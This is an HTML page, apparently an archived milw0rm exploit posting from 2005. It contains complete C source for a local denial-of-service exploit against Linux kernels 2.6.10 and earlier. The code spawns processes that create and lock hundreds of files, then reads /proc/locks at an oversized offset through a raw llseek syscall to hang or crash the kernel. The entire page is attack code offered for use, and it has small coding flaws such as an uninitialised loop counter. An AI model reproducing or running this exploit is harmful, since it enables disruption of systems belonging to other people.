<html><head><title>Linux Kernel <= 2.6.10 Local Denial of Service Exploit</title></head><pre>/* Removed ='s at the bottom /str0ke */

/*
 * linux kernel &lt;=2.6.10(2.6.x) DOS exploit
 * writen by ChoiX
 * (c) uKt Research
 * [www.unl0ck.org][info@unl0ck.org]
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;linux/unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/file.h&gt;
#include &lt;syscall.h&gt;
#include &lt;errno.h&gt;

#define SIZE 0x80004242

_syscall5(int, _llseek, uint, fd, ulong, hi, ulong, lo, loff_t *, res, uint, wh);

void createfile(){
int nm1, filev;
char vname[424];

for(nm1=0;nm1&lt;920;nm1++){
	snprintf(vname, sizeof(vname), &quot;UNLOCKRESEARCHTEAM%d.%d&quot;, getpid(), nm1);
	filev = open(vname, O_CREAT|O_RDWR, S_IRWXU);
	if(filev &lt; 0){
		printf(&quot;ERROR\n&quot;);
		perror(&quot;open()&quot;);
	}
	if(flock(filev,LOCK_EX) == -1){
		printf(&quot;ERROR\n&quot;);
		perror(&quot;flock()&quot;);
	}
}
while(42);
}

int main(int argc, char *argv[]){
int count, fd, i, fv;
void *mv;
char *buf1, *buf2;
loff_t lr;
int nm1;

printf(&quot;\t\tkernel-2.6.10 DoS by ChoiX [Unl0ck Team]\n&quot;);
printf(&quot;[--]create files(it can take a few minutes)...&quot;);
nm1 = 5;
while(count--){
	if(!fork()){
		createfile();
	}
}
sleep(100);

printf(&quot;OK\n&quot;);

printf(&quot;[--]start exploiting...&quot;);

system(&quot;sync&quot;);
fd=open(&quot;/proc/locks&quot;, O_RDONLY);
if(fd &lt; 0){
	printf(&quot;ERROR\n&quot;);
	perror(&quot;open()&quot;);
}
buf1 = malloc(1024*1024*8);
buf2 = malloc(1024*1024*8);

if(_llseek(fd,42,SIZE,&amp;lr,SEEK_SET) == -1){
	printf(&quot;ERROR\n&quot;);
	printf(&quot;llseek()&quot;);
}
i=read(fd,buf2, SIZE);
perror(&quot;read&quot;);
printf(&quot;read=%d mv=%x fv=%x\n %.300s&quot;,i,(int)mv,fv,buf2);
while(42);
return 42;
}

// milw0rm.com [2005-03-29]</pre></html>